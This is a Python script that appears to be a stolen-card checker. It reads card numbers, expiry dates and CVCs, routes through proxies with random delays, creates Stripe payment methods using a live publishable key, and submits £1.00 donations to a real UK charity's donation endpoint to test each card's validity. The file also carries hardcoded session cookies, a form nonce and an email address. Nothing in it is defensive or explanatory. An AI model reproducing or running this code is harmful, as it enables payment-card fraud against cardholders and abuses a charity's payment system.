import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))
        
        

        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        data = f'type=card&billing_details[name]=Thura&billing_details[email]=thur07656%40gmail.com&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1577ab39-f384-4718-b602-8c6e2a851115547985&muid=0fc76816-c7ce-466f-b0d3-0d71d2708f3dafff95&sid=00ae42e3-f15e-467b-ac2b-713201067aa978cd55&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fwww.unwomenuk.org&time_on_page=81218&key=pk_live_51BNf9mCVSFWcp0yr5JF7DJOmRknHMhl6J3XyHMCVHVbfnnxRFmLoYNVpkZqNOSo3Ukc4Jd9GTKVuEUgbe7IXY9oz00YypBtRBz'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
        	id = response.json()['id']
        except:
        	pass


        cookies = {
    'charitable_session': '156a3774ea78aae012e48037de76b914||86400||82800',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-12-29%2006%3A16%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.unwomenuk.org%2Fcampaigns%2Fdonate-to-make-all-public-spaces-safe-spaces-now%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-12-29%2006%3A16%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.unwomenuk.org%2Fcampaigns%2Fdonate-to-make-all-public-spaces-safe-spaces-now%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.unwomenuk.org%2Fcampaigns%2Fdonate-to-make-all-public-spaces-safe-spaces-now%2F',
    '_hjSessionUser_2772005': 'eyJpZCI6IjczMDg2MTcwLWMwMmYtNTA0OS05ZjkzLWZiOGY3MTU0MThhMSIsImNyZWF0ZWQiOjE3MzU0NTI5OTE4OTksImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_2772005': 'eyJpZCI6IjdiZTI5MTAyLWRiNTAtNGYzOC1hYzg4LTgxYjk0NWI4OTc0ZSIsImMiOjE3MzU0NTI5OTE5MDQsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '__stripe_mid': '0fc76816-c7ce-466f-b0d3-0d71d2708f3dafff95',
    '__stripe_sid': '00ae42e3-f15e-467b-ac2b-713201067aa978cd55',
}

        headers = {
    'authority': 'www.unwomenuk.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.unwomenuk.org',
    'referer': 'https://www.unwomenuk.org/campaigns/donate-to-make-all-public-spaces-safe-spaces-now/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

        data = f'charitable_form_id=6770e93c91b0d&6770e93c91b0d=&_charitable_donation_nonce=3e9d69163f&_wp_http_referer=%2Fcampaigns%2Fdonate-to-make-all-public-spaces-safe-spaces-now%2F&campaign_id=217854&description=Donate+to+make+all+public+spaces%2C+Safe+Spaces+Now!&ID=0&donation_amount=custom&custom_donation_amount=1.00&first_name=Khant+Ti&last_name=Kyi&email=thur07656%40gmail.com&gateway=stripe&stripe_payment_method={id}&contact_consent=1&action=make_donation&form_action=make_donation'

        r2 = requests.post('https://www.unwomenuk.org/site/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

        
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
